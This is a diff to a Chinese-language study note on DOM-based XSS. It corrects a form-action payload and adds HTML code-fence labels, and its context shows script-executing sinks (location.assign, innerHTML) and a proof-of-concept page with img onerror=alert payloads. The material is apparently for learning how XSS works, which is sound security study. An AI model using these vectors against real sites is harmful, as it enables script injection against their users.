@@ -179,7 +179,7 @@ document.location.href // 例2 document.location.href='javascript:alert(1)';  //
 location.assign        // 例3 location.assign("javascript:alert(1)")
 location.replace       // 例4 location.replace("javascript:alert(1)")
 
-<form action='javascript:alert1'> // submit
+<form action='javascript:alert(1)'> <input type=submit> </form>  // submit 提交表单时触发XSS
 
 ----
 
@@ -195,7 +195,7 @@ crypto.generateCRMFRequest
   * "HTML代码" 进行读`outerHTML`   写`innerHTML`【可导致XSS】
   * "纯文本" 进行读 `outerText`   写 `innerText`
 
-```
+```html
 <div id="test">
    <span style="color:red">test1</span> test2
 </div>
@@ -217,7 +217,7 @@ crypto.generateCRMFRequest
 
 
 构造poc1.html
-```
+```html
 <a id=a></a>
 <title id=b></title>
 <div id=c></div>
@@ -233,7 +233,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 打开poc1.html
 
 通过浏览器的开发者工具 查看经过DOM解析(javascript执行后)的页面代码:
-```
+```html
 <html><head></head>
 <body>
 <a id="a"><img src="@" onerror="alert(1)"></a>
@@ -253,7 +253,7 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 
 因为使用`.innerHTML`写进以下这些HTML标签中时，不会解析`Html实体(Html Entity)`  如不会将 `&lt;` 解析为`<` :
 
-```
+```html
 <textarea>
 <title>
 <iframe>
